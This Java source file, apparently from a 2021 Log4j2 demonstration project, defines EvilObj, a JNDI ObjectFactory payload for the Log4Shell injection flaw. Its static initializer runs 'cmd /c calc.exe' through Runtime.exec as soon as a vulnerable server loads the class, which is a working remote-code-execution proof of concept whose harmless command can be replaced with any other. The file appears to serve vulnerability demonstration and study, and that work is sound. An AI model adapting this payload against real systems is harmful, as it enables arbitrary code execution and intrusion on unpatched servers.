package com.example.log4j2demo;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Hashtable;

/**
 * @author youngbear
 * @email youngbear@aliyun.com
 * @date 2021/12/14 21:38
 * @blog https://blog.csdn.net/next_second
 * @github https://github.com/YoungBear
 * @description
 */
public class EvilObj implements ObjectFactory {

    static {
        System.out.println("begin to run EvilObj static code...");

        try {
            Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc.exe"});
            InputStream inputStream = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            p.waitFor();
            inputStream.close();
            reader.close();
            p.destroy();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("getObjectInstance of EvilObj ...");
        return null;
    }

}
